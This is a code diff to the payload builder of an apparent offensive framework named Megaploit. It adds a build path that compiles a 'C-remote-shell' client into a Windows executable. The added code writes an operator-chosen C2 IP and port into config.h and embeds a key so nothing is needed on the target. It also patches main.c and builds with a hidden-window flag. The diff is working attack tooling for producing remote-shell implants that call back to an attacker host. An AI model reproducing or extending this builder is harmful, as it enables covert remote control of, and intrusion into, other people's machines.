@@ -71,6 +71,7 @@ class OutputFormat(str, Enum):
     ELF         = "elf"
     GO_EXE      = "go_exe"    # Go agent compiled to Windows EXE
     GO_ELF      = "go_elf"    # Go agent compiled to Linux ELF
+    C_EXE       = "c_exe"     # C-remote-shell client compiled to Windows EXE
     ONELINER_PY  = "oneliner_py"
     ONELINER_PS1 = "oneliner_ps1"
 
@@ -422,6 +423,10 @@ class PayloadBuilder:
         ts  = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
         sk  = base64.b64encode(cfg.secret_key or b"\x00" * 32).decode()
 
+        # C-EXE is handled entirely in _write_or_compile; return empty bytes here
+        if fmt == OutputFormat.C_EXE:
+            return b""
+
         # Build the Python agent source first
         agent_src = _AGENT_SOURCE_TEMPLATE.format(
             timestamp=ts,
@@ -496,6 +501,10 @@ class PayloadBuilder:
     def _write_or_compile(self, data: bytes, cfg: BuildConfig) -> BuildResult:
         fmt = cfg.format
         sha = hashlib.sha256(data).hexdigest()
+
+        # Binary compilation — C-remote-shell Windows EXE
+        if fmt == OutputFormat.C_EXE:
+            return self._compile_c_agent(cfg)
 
         # Binary compilation — Go agent
         if fmt in (OutputFormat.GO_EXE, OutputFormat.GO_ELF):
@@ -601,8 +610,258 @@ class PayloadBuilder:
             )
 
     # ------------------------------------------------------------------
+    # C agent compilation
+    # ------------------------------------------------------------------
+
+    def _compile_c_agent(self, cfg: BuildConfig) -> BuildResult:
+        """
+        Compile the C-remote-shell client from the C-remote-shell source tree.
+
+        Source layout is auto-discovered via megaploit.core.c_probe so that
+        no subdirectory names are hardcoded here — the prober locates:
+          - the config.h to patch (file that defines C2_IP / C2_PORT)
+          - the main.c entry point
+          - all .c files that contain the four C2 security layers
+
+        Requires either:
+          cl.exe   (MSVC — available in a Developer Command Prompt)
+          x86_64-w64-mingw32-gcc  (MinGW cross-compiler on Linux/macOS)
+        """
+        import shutil, subprocess, tempfile, os, hashlib, time as _time, textwrap
+
+        # Locate the C-remote-shell source tree relative to this file
+        here   = os.path.dirname(os.path.abspath(__file__))
+        c_root = os.path.normpath(os.path.join(here, "..", "C-remote-shell"))
+        if not os.path.isdir(c_root):
+            return BuildResult(
+                ok=False, format=cfg.format,
+                error=f"C-remote-shell source not found at: {c_root}",
+            )
+
+        # ── Use c_probe to auto-discover the source structure ──────────────
+        from megaploit.core.c_probe import probe as _probe
+        pr = _probe(c_root)
+        if not pr.compliant:
+            missing = ", ".join(s.signal.name for s in pr.required_missing)
+            return BuildResult(
+                ok=False, format=cfg.format,
+                error=f"C source tree is not C2-compliant. Missing: {missing}",
+            )
+
+        # Walk the tree to find all .c source files that belong to the client.
+        # We include every .c file that is NOT under server/ and NOT the
+        # standalone serverShell.c (which has its own main()).
+        client_sources: list[str] = []
+        for dirpath, _dirs, filenames in os.walk(c_root):
+            _dirs[:] = [d for d in _dirs if d not in (".git", "build",
+                                                       "Release", "Debug",
+                                                       "server")]
+            reldir = os.path.relpath(dirpath, c_root)
+            for fname in sorted(filenames):
+                if not fname.lower().endswith(".c"):
+                    continue
+                if fname.lower() == "servershell.c":
+                    continue
+                client_sources.append(os.path.join(dirpath, fname))
+
+        if not client_sources:
+            return BuildResult(
+                ok=False, format=cfg.format,
+                error="No client .c files found in C-remote-shell tree",
+            )
+
+        # Find config.h — first .h file that contains C2_IP definition
+        config_path: str | None = None
+        for dirpath, _dirs, filenames in os.walk(c_root):
+            _dirs[:] = [d for d in _dirs if d not in (".git", "build", "server")]
+            for fname in filenames:
+                if fname.lower() == "config.h":
+                    candidate = os.path.join(dirpath, fname)
+                    try:
+                        with open(candidate, encoding="utf-8", errors="replace") as f:
+                            txt = f.read()
+                        if "C2_IP" in txt and "C2_PORT" in txt:
+                            config_path = candidate
+                            break
+                    except OSError:
+                        pass
+            if config_path:
+                break
+
+        if not config_path:
+            return BuildResult(
+                ok=False, format=cfg.format,
+                error="config.h with C2_IP/C2_PORT not found in C-remote-shell tree",
+            )
+
+        # Embed the key as a static hex array — no secret.key file needed
+        key_bytes = cfg.secret_key or b"\x00" * 32
+        key_hex_array = ", ".join(f"0x{b:02x}" for b in key_bytes[:32])
+
+        patched_config = textwrap.dedent(f"""\
+            /* config.h — generated by Megaploit payload builder */
+            #pragma once
+            #ifndef CLIENT_CONFIG_H
+            #define CLIENT_CONFIG_H
+
+            #define C2_IP               "{cfg.lhost}"
+            #define C2_PORT             {cfg.lport}
+            #define RECONNECT_DELAY_SEC 10
+            #define SECRET_KEY_PATH     "secret.key"  /* unused — key embedded */
+            #define SECRET_KEY_LEN      32
+            #define SHELL_LINE_BUF      1024
+            #define SHELL_RESP_BUF      18384
+
+            /* 32-byte key embedded at build time — no file needed on target */
+            static const unsigned char _EMBEDDED_KEY[32] = {{ {key_hex_array} }};
+
+            #endif /* CLIENT_CONFIG_H */
+        """)
+
+        # Back up the original config.h; we restore it in the finally block
+        with open(config_path, "r", encoding="utf-8") as f:
+            original_config = f.read()
+
+        t0 = _time.time()
+        try:
+            with open(config_path, "w", encoding="utf-8") as f:
+                f.write(patched_config)
+
+            # Work in a temp directory; copy all discovered sources so we
+            # can patch main.c without modifying the original source tree.
+            with tempfile.TemporaryDirectory() as tmp:
+                # Replicate only the directories that contain client sources
+                copied: dict[str, str] = {}   # original → tmp path
+                seen_dirs: set[str] = set()
+                for src in client_sources:
+                    rel  = os.path.relpath(src, c_root)
+                    dst  = os.path.join(tmp, rel)
+                    dst_dir = os.path.dirname(dst)
+                    if dst_dir not in seen_dirs:
+                        os.makedirs(dst_dir, exist_ok=True)
+                        seen_dirs.add(dst_dir)
+                    shutil.copy2(src, dst)
+                    copied[src] = dst
+
+                # Copy all .h files from any directory that already has .c files
+                src_dirs = {os.path.dirname(s) for s in client_sources}
+                src_dirs.add(c_root)   # root-level headers
+                for src_dir in src_dirs:
+                    for fname in os.listdir(src_dir):
+                        if fname.lower().endswith(".h"):
+                            src_h = os.path.join(src_dir, fname)
+                            rel_h = os.path.relpath(src_h, c_root)
+                            dst_h = os.path.join(tmp, rel_h)
+                            os.makedirs(os.path.dirname(dst_h), exist_ok=True)
+                            shutil.copy2(src_h, dst_h)
+
+                # Patch main.c in tmp: use _EMBEDDED_KEY instead of file load
+                for orig, tmpc in copied.items():
+                    if os.path.basename(orig).lower() == "main.c":
+                        with open(tmpc, "r", encoding="utf-8") as f:
+                            main_src = f.read()
+                        main_src = main_src.replace(
+                            "if (!load_secret_key(SECRET_KEY_PATH, secretKey))",
+                            "memcpy(secretKey, _EMBEDDED_KEY, 32); if (0)"
+                        )
+                        with open(tmpc, "w", encoding="utf-8") as f:
+                            f.write(main_src)
+
+                # Build source list (tmp copies)
+                tmp_sources = [copied[s] for s in client_sources]
+
+                out_name = (cfg.name or "megaploit_c_agent") + ".exe"
+                out_path = os.path.join(tmp, out_name)
+
+                # Try MSVC first, then MinGW
+                cl    = shutil.which("cl")
+                mingw = shutil.which("x86_64-w64-mingw32-gcc")
+
+                if cl:
+                    cmd = (
+                        ["cl", "/nologo", "/W3", "/O2", "/DNDEBUG"]
+                        + tmp_sources
+                        + ["/link", "Secur32.lib", "Crypt32.lib",
+                           "ws2_32.lib", "bcrypt.lib", "Advapi32.lib",
+                           "User32.lib", f"/out:{out_path}"]
+                    )
+                    compiler_label = "MSVC cl.exe"
+                elif mingw:
+                    cmd = (
+                        [mingw, "-O2", "-DNDEBUG", "-DUNICODE", "-D_UNICODE",
+                         "-DSECURITY_WIN32"]
+                        + tmp_sources
+                        + ["-o", out_path,
+                           "-lsecur32", "-lcrypt32", "-lws2_32",
+                           "-lbcrypt", "-ladvapi32", "-luser32",
+                           "-mwindows"]
+                    )
+                    compiler_label = "MinGW x86_64-w64-mingw32-gcc"
+                else:
+                    return BuildResult(
+                        ok=False, format=cfg.format,
+                        error=(
+                            "No C compiler found. Install one of:\n"
+                            "  MSVC: open a 'Developer Command Prompt for VS'\n"
+                            "  MinGW: apt install mingw-w64  (Linux/macOS)"
+                        ),
+                    )
+
+                try:
+                    subprocess.check_call(
+                        cmd,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.STDOUT,
+                        timeout=120,
+                    )
+                except subprocess.CalledProcessError as exc:
+                    return BuildResult(
+                        ok=False, format=cfg.format,
+                        error=f"{compiler_label} exited with code {exc.returncode}",
+                        build_time_s=_time.time() - t0,
+                    )
+                except subprocess.TimeoutExpired:
+                    return BuildResult(
+                        ok=False, format=cfg.format,
+                        error=f"{compiler_label} timed out (120s)",
+                        build_time_s=_time.time() - t0,
+                    )
+
+                if not os.path.isfile(out_path):
+                    return BuildResult(
+                        ok=False, format=cfg.format,
+                        error=f"{compiler_label} succeeded but binary not found",
+                        build_time_s=_time.time() - t0,
+                    )
+
+                # Move to final destination
+                if cfg.output_path:
+                    shutil.copy2(out_path, cfg.output_path)
+                    final = cfg.output_path
+                else:
+                    final = os.path.abspath(out_name)
+                    shutil.copy2(out_path, final)
+
+                size = os.path.getsize(final)
+                with open(final, "rb") as fh:
+                    sha = hashlib.sha256(fh.read()).hexdigest()
+
+                return BuildResult(
+                    ok=True, format=cfg.format,
+                    output_path=final,
+                    size=size, sha256=sha,
+                    build_time_s=_time.time() - t0,
+                )
+
+        finally:
+            # Always restore the original config.h
+            with open(config_path, "w", encoding="utf-8") as f:
+                f.write(original_config)
+
+    # ------------------------------------------------------------------
     # Go agent compilation
     # ------------------------------------------------------------------
+
 
     def _compile_go(self, cfg: BuildConfig) -> BuildResult:
         """
